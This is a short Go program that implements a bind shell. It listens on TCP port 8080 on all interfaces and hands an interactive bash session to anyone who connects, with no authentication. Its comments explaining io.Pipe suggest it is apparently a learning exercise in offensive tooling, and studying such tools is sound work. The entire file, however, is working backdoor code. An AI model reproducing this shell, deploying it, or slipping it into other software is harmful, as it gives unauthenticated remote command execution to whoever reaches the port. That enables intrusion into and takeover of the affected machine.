package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	cmd := exec.Command("/bin/bash", "-i")

	//o.Pipe() creates both a reader and a writer that are synchronously connected—any data written
	//to the writer (wp in this example) will be read by the reader (rp).
	rp, wp := io.Pipe()

	// Set stdin to our connection
	cmd.Stdin = conn

	//assign the writer to cmd.Stdout and then use io.Copy(conn, rp) to link the PipeReader to the TCP connection
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}

}

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalln("could not bound port to interface")
	}
	log.Println("listening on 0.0.0.0:8080")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("couln not accept the connection")
		}
		log.Printf("connection to host %s established", conn.RemoteAddr())
		go handle(conn)
	}
}
